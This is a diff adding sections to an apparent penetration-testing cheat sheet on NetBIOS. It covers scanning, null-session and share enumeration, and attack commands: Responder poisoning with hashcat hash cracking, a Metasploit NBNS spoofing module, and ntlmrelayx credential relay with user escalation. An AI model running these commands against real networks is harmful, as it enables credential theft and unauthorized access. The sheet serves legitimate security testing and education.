@@ -2,8 +2,12 @@
 --- NetBIOS ---
 
 • Connect
+• Recon
 • Enumeration
 • Attack Vectors
+• Post-Exploitation
+NetBIOS Name Suffixes
+
 
 
 NetBIOS (Network Basic Input/Output System) is a network protocol that allows applications on different computers to communicate within a local area network (LAN). 
@@ -16,52 +20,167 @@ Default Ports: 137 (Name Service), 138 (Datagram), 139 (Session)
 
 -- Connect --
 
+➜ Using nbtscan
+
+nbtscan 192.168.1.0/24
+nbtscan target.com
+nbtscan -v target.com
+nbtscan 192.168.1.0/24 > netbios_scan.txt
+
+➜ Using nmblookup
+
+nmblookup -A target.com
+nmblookup target
+nmblookup -M -- -  # Find master browser
+nmblookup -d 2 '*'  # Find workgroup
+
+
+-- Recon --
+
+NetBIOS names provide valuable information about computer names, workgroups, domains, and running services on Windows systems:
+
+nmap -p 137,138,139 target.com
+nmap -sU -p 137 --script nbstat target.com
+
+nbtscan -r 192.168.1.0/24
+
+nmblookup -A 192.168.1.100
+nmblookup -A target.com
+Output interpretation: <00> = Workstation, <03> = Messenger service, <20> = Server service, <1B> = Domain Master Browser, <1D> = Master Browser
+
+
+-- Enumeration --
+
+➜ Null Session Enumeration: Null sessions exploit Windows' default behavior of allowing anonymous connections to enumerate sensitive information:
+
+# Using enum4linux
+enum4linux -a target.com
+
+# Enumerate users
+enum4linux -U target.com
+
+# Enumerate shares
+enum4linux -S target.com
+
+# Get password policy
+enum4linux -P target.com
+
+rpcclient -U "" target.com
+
+# Hit enter for blank password: 
+rpcclient $> enumdomusers
+rpcclient $> enumdomgroups
+rpcclient $> queryuser 500
+
+➜ Share Enumeration: NetBIOS can reveal shared folders and their permissions, often exposing sensitive data:
+
+smbclient -L //target.com -N
+nmap -p 139,445 --script smb-enum-shares target.com
+smbmap -H target.com
+smbmap -H target.com -u guest
+
+
+-- Attack Vectors --
+
+➜ NetBIOS Name Spoofing
+
+sudo responder -I eth0 -wrf
+hashcat -m 5600 hash.txt rockyou.txt
+
+➜ NBT-NS Poisoning
+
+use auxiliary/spoof/nbns/nbns_response
+set INTERFACE eth0
+set SPOOFIP attacker-ip
+run
+
+
+-- Post-Exploitation --
+
+
+➜ Information Gathering
+
+enum4linux -a target.com > netbios_enum.txt
+
+# Parse interesting information
+grep "Domain Name" netbios_enum.txt
+grep "Domain SID" netbios_enum.txt
+grep "Password Info" netbios_enum.txt
+
+➜ Credential Relay
+
+ntlmrelayx.py -t target.com -smb2support
+ntlmrelayx.py -t ldap://dc.domain.com --escalate-user lowpriv_user
+
+
+-- NetBIOS Name Suffixes --
+
++--------+------+-------------------------------+
+| Suffix | Type | Description                   |
++--------+------+-------------------------------+
+| <00>   | U    | Workstation/Redirector        |
++--------+------+-------------------------------+
+| <03>   | U    | Messenger Service             |
++--------+------+-------------------------------+
+| <06>   | U    | RAS Server Service            |
++--------+------+-------------------------------+
+| <1B>   | U    | Domain Master Browser         |
++--------+------+-------------------------------+
+| <1C>   | G    | Domain Controllers            |
++--------+------+-------------------------------+
+| <1D>   | U    | Master Browser                |
++--------+------+-------------------------------+
+| <1E>   | G    | Browser Service Elections     |
++--------+------+-------------------------------+
+| <20>   | U    | File Server Service           |
++--------+------+-------------------------------+
+
+
+-- Common Commands --
+
++------------+---------------------------+------------------------------+
+| Command    | Description               | Usage                        |
++------------+---------------------------+------------------------------+
+| nbtscan    | NetBIOS scanner           | nbtscan 192.168.1.0/24       |
++------------+---------------------------+------------------------------+
+| nmblookup  | NetBIOS lookup            | nmblookup -A target.com      |
++------------+---------------------------+------------------------------+
+| enum4linux | Enumeration tool          | enum4linux -a target.com     |
++------------+---------------------------+------------------------------+
+| rpcclient  | RPC client                | rpcclient -U "" target.com   |
++------------+---------------------------+------------------------------+
+
+
+-- Useful Tools --
+
++-----------+-------------------------------+--------------------------+
+| Tool      | Description                   | Primary Use Case         |
++-----------+-------------------------------+--------------------------+
+| nbtscan   | NetBIOS scanner               | Network enumeration      |
++-----------+-------------------------------+--------------------------+
+| enum4linux| SMB/NetBIOS enumeration       | Information gathering    |
++-----------+-------------------------------+--------------------------+
+| Responder | LLMNR/NBT-NS poisoner         | Credential capture       |
++-----------+-------------------------------+--------------------------+
+| nmblookup | NetBIOS lookup                | Name resolution          |
++-----------+-------------------------------+--------------------------+
+| rpcclient | RPC interaction               | Null session enum        |
++-----------+-------------------------------+--------------------------+
+| Metasploit| Exploitation framework        | Automated testing        |
++-----------+-------------------------------+--------------------------+
+
+
+-- Security Misconfigurations --
+
+❌ NetBIOS enabled on internet-facing hosts
+❌ Null session allowed
+❌ No SMB signing
+❌ NBT-NS/LLMNR enabled
+❌ Guest account enabled
+❌ Weak share permissions
+❌ No network segmentation
+❌ Information leakage via NetBIOS
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+*
